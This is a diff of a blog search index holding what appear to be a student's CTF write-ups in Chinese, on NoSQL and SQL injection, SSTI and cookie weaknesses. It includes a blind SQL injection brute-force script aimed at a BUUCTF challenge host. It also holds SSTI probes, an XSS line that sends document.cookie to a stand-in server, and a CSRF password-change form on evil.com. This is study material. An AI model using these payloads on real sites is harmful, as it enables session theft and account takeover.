@@ -1,16 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>从零开始的CTF冒险（一）！</title>
-    <url>/posts/6249b303/</url>
-    <content><![CDATA[<h1 id="以此文记录我在学习CTF中的心路历程，日拱一卒，功不唐捐。"><a href="#以此文记录我在学习CTF中的心路历程，日拱一卒，功不唐捐。" class="headerlink" title="以此文记录我在学习CTF中的心路历程，日拱一卒，功不唐捐。"></a>以此文记录我在学习CTF中的心路历程，日拱一卒，功不唐捐。</h1><h2 id="一、WEB学习目录"><a href="#一、WEB学习目录" class="headerlink" title="一、WEB学习目录"></a>一、WEB学习目录</h2><h3 id="工具篇："><a href="#工具篇：" class="headerlink" title="工具篇："></a>工具篇：</h3><p>WEB的常用工具有：<br>BurpSuite（一款常用的抓包工具，应用广泛，文件上传必不可少的利器）<br>Hackerbar（浏览器插件，传参的好帮手）<br>蚁剑（连接工具）<br>还有许许多多的部署在Linux上的工具，……这里的东西就以后再来探索吧（）<br>###<br>拥有了入门的工具，就可以步入WEB的世界力（喜）</p>
-<h3 id="WEB包括哪些内容："><a href="#WEB包括哪些内容：" class="headerlink" title="WEB包括哪些内容："></a>WEB包括哪些内容：</h3><p>1.文件包含<br>2.文件上传</p>
-]]></content>
-      <tags>
-        <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>NoSQL</title>
     <url>/posts/f0940727/</url>
     <content><![CDATA[<h1 id="NoSQL注入"><a href="#NoSQL注入" class="headerlink" title="NoSQL注入"></a>NoSQL注入</h1><h3 id="意外在学习内网渗透途中接触到了NoSQL注入，发现知识库里也没有，所以在这里记录一下"><a href="#意外在学习内网渗透途中接触到了NoSQL注入，发现知识库里也没有，所以在这里记录一下" class="headerlink" title="意外在学习内网渗透途中接触到了NoSQL注入，发现知识库里也没有，所以在这里记录一下"></a>意外在学习内网渗透途中接触到了NoSQL注入，发现知识库里也没有，所以在这里记录一下</h3><h4 id="什么是NoSQL？"><a href="#什么是NoSQL？" class="headerlink" title="什么是NoSQL？"></a>什么是NoSQL？</h4><p>NoSQL 即 Not Only SQL，意即 “不仅仅是SQL”。NoSQL 是一项全新的数据库革命性运动，早期就有人提出，发展至 2009 年趋势越发高涨。NoSQL的拥护者们提倡运用非关系型的数据存储，相对于铺天盖地的关系型数据库运用，这一概念无疑是一种全新的思维的注入。</p>
@@ -80,10 +70,66 @@ https://www.bilibili.com/video/BV1Zs42137tf
 <p>题目给库名和表名都是flag<br>所以用<em>id&#x3D;0^(ascii(substr((select(flag)from(flag)),1,1))&gt;101)</em><br>来查询，由于当&gt;102的时候报错，说明第一个字符就是102的ascii所对应的字符，也就是f<br>然后使用脚本</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://bdff4bff-23c2-43c2-969e-74bedf958792.node3.buuoj.cn/index.php&quot;</span><br><span class="line"></span><br><span class="line">result = &quot;&quot;</span><br><span class="line">num = 0  # 用了来判断是不是flag已经拼完整了</span><br><span class="line">for i in range(1, 60):</span><br><span class="line"></span><br><span class="line">    if num == 1:</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line">    for j in range(32, 128):</span><br><span class="line"></span><br><span class="line">        payload = &quot;if(ascii(substr((select(flag)from(flag)),%d,1))=%d,1,2)&quot; % (i, j)</span><br><span class="line">        # print(str((i-1)*96+j-32)+&quot;:~&quot;+payload+&quot;~&quot;)</span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">            &quot;id&quot;: payload,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line"></span><br><span class="line">        r.encoding = r.apparent_encoding</span><br><span class="line"></span><br><span class="line">        if &quot;Hello&quot; in r.text:</span><br><span class="line">            x = chr(j)</span><br><span class="line">            result += str(x)</span><br><span class="line">            print(result)</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">        if &quot;&#125;&quot; in result:</span><br><span class="line">            print(result)</span><br><span class="line">            num = 1</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
 
-<p>得到flag</p>
+<p>得到flag  </p>
 ]]></content>
       <tags>
         <tag>周报</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SSTI</title>
+    <url>/posts/47d18edd/</url>
+    <content><![CDATA[<h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><p>做了一道BUUCTF题，接触了许多新的知识点。在这里记录一下<br>题目在这：</p>
+<blockquote>
+<p>👉 <a href="https://buuoj.cn/challenges#[BJDCTF2020]Cookie%20is%20so%20stable">BJDCTF2020 题目链接</a></p>
+</blockquote>
+<h2 id="1-SSTI"><a href="#1-SSTI" class="headerlink" title="1.SSTI"></a>1.SSTI</h2><p>SSTI是这道题所考察的知识点，所以写在最前面  </p>
+<h3 id="如何判断是SSTI"><a href="#如何判断是SSTI" class="headerlink" title="如何判断是SSTI"></a>如何判断是SSTI</h3><p>众所周知，SSTI是利用服务器模板漏洞，在模板引擎中注入恶意代码来进行攻击。<br>所以我们可以通过输入一些特殊的“探针”，观察服务器响应的变化来判断是否存在SSTI<br>常见的SSTI探针：</p>
+
+    {{7*7}}               # Jinja2, Nunjucks, Twig等
+    ${7*7}                # JSP, Freemarker, Spring
+    <%= 7 * 7 %>          # EJS (Embedded JavaScript)
+    #{7*7}                # Thymeleaf
+
+<p>我们可以在输入框、URL参数、HTTP头、Cookies等位置尝试输入这些探针。然后查看页面返回里有没有49，如果有49，说明这里执行成功了，则存在SSTI漏洞  </p>
+<p>不同的模板中使用不同的注入格式</p>
+<ul>
+<li><strong>Jinja2 和 Twig</strong>: 使用 <code>&#123;&#123; &#125;&#125;</code></li>
+<li><strong>Freemarker 和 Spring</strong>: 使用 <code>$&#123; &#125;</code></li>
+<li><strong>EJS</strong>: 使用 <code>&lt;%= %&gt;</code></li>
+<li><strong>Thymeleaf</strong>: 使用 <code>#&#123; &#125;</code><br>有时候会对大括号之类的进行过滤，所以可以用Unicode进行绕过</li>
+</ul>
+<blockquote>
+<p>👉 <a href="https://forum.butian.net/share/1371">SSTI 利用的文章</a></p>
+</blockquote>
+<h2 id="2-这道题提示查看Cookie，看看能从Cookie中突破的还有什么？"><a href="#2-这道题提示查看Cookie，看看能从Cookie中突破的还有什么？" class="headerlink" title="2.这道题提示查看Cookie，看看能从Cookie中突破的还有什么？"></a>2.这道题提示查看Cookie，看看能从Cookie中突破的还有什么？</h2><p>Cookie可以从以下方面入手<br>1.HttpOnly、Secure、SameSite 标志：如果Cookie没有设置这些标志，可能可以通过XSS攻击窃取Cookie。<br>2.弱JWT签名：如果JWT使用弱的对称加密密钥（如 secret）或无签名 (none algorithm)，可以直接伪造JWT。<br>3.客户端验证：CTF中常见的“role&#x3D;guest”→“role&#x3D;admin”权限提升。<br>4.会话固定 (Session Fixation)：如果你能控制Session ID，可能可以冒充管理员。  </p>
+<p>这里详细写一下第一点和第二点  </p>
+<p>一、HttpOnly、Secure、SameSite 标志<br>我们可以使用F12打开控制台，然后在应用程序 (Application)”→“存储 (Storage)”→“Cookies”中，检查Cookie的属性：</p>
+<pre><code>HttpOnly：如果未启用，可能可以通过XSS攻击来窃取Cookie。
+Secure：如果未启用，可能会在HTTP而不是HTTPS上传输Cookie。
+SameSite：如果为None，可能可用于CSRF攻击。  
+</code></pre>
+<h4 id="1-利用-HttpOnly"><a href="#1-利用-HttpOnly" class="headerlink" title="1. 利用 HttpOnly"></a>1. 利用 HttpOnly</h4><p>开启HttpOnly则禁止通过JavaScript访问Cookie  如果这里是关的，那就可以  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;fetch(&#x27;http://yourserver.com/steal?cookie=&#x27; + document.cookie);&lt;/script&gt;    </span><br></pre></td></tr></table></figure>
+<p>通过钓鱼的方式来获取管理员的会话ID  </p>
+<h4 id="2-利用未设置-Secure-的-Cookie"><a href="#2-利用未设置-Secure-的-Cookie" class="headerlink" title="2. 利用未设置 Secure 的 Cookie"></a>2. 利用未设置 Secure 的 Cookie</h4><p>使用Burp Suite或Wireshark进行抓包。<br>在HTTP请求中，寻找Cookie: PHPSESSID&#x3D;xxxx。<br>如果会话ID出现在HTTP请求中，而不是HTTPS中，则可以劫持会话。<br>如果题目考察是中间人攻击 (MITM)，你可以使用Wireshark来捕获Cookie：<br>过滤器：http.cookie。<br>查找“Set-Cookie”或“Cookie”字段中的会话ID。 </p>
+<h4 id="3-利用不安全的-SameSite-属性"><a href="#3-利用不安全的-SameSite-属性" class="headerlink" title="3. 利用不安全的 SameSite 属性"></a>3. 利用不安全的 SameSite 属性</h4><p>如果SameSite标志为None，则跨站请求可以携带会话ID。<br>这使得CSRF攻击成为可能。<br>在攻击者的网站（比如 http:&#x2F; &#x2F;evil.com）上放置以下表单：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;form action=&quot;http ://victim.com/change_password.php&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">  &lt;input type=&quot;hidden&quot; name=&quot;password&quot; value=&quot;newpassword123&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script&gt;document.forms[0].submit();&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>如果受害者访问evil. com，表单会在受害者的会话中自动提交。</p>
+<p>如果SameSite&#x3D;None，浏览器会将受害者的会话ID (PHPSESSID) 自动携带到请求中，管理员的身份将被利用。</p>
+]]></content>
+      <tags>
+        <tag>周报</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>从零开始的CTF冒险（一）！</title>
+    <url>/posts/6249b303/</url>
+    <content><![CDATA[<h1 id="以此文记录我在学习CTF中的心路历程，日拱一卒，功不唐捐。"><a href="#以此文记录我在学习CTF中的心路历程，日拱一卒，功不唐捐。" class="headerlink" title="以此文记录我在学习CTF中的心路历程，日拱一卒，功不唐捐。"></a>以此文记录我在学习CTF中的心路历程，日拱一卒，功不唐捐。</h1><h2 id="一、WEB学习目录"><a href="#一、WEB学习目录" class="headerlink" title="一、WEB学习目录"></a>一、WEB学习目录</h2><h3 id="工具篇："><a href="#工具篇：" class="headerlink" title="工具篇："></a>工具篇：</h3><p>WEB的常用工具有：<br>BurpSuite（一款常用的抓包工具，应用广泛，文件上传必不可少的利器）<br>Hackerbar（浏览器插件，传参的好帮手）<br>蚁剑（连接工具）<br>还有许许多多的部署在Linux上的工具，……这里的东西就以后再来探索吧（）<br>###<br>拥有了入门的工具，就可以步入WEB的世界力（喜）</p>
+<h3 id="WEB包括哪些内容："><a href="#WEB包括哪些内容：" class="headerlink" title="WEB包括哪些内容："></a>WEB包括哪些内容：</h3><p>1.文件包含<br>2.文件上传</p>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
       </tags>
   </entry>
 </search>
